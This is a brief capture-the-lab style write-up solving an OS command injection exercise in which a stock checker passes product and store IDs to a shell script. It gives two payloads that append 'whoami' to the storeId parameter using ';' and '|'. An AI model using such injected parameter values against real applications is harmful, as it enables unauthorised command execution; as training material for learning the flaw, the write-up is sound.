# Lab: OS command injection, simple case
## Task
This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the `whoami` command to determine the name of the current user.

## Solution
In this lab, the `productID` and `storeID` will be passed to a shell command
```
stockreport.pl <productID> <storeID>
```

To exploit this, we can concatenate the `whoami` command to these parameters:
```
productId=1&storeId=1;whoami
# or
productId=1&storeId=1|whoami
```

First payload:  

![image](https://user-images.githubusercontent.com/44528004/130424642-c5a69dc4-c028-48b2-b41d-96666495cfa3.png)  

Second payload:  

![image](https://user-images.githubusercontent.com/44528004/130424678-28f4a75b-a10d-4ca8-a83c-3fc9ab06c329.png)

> Solved!
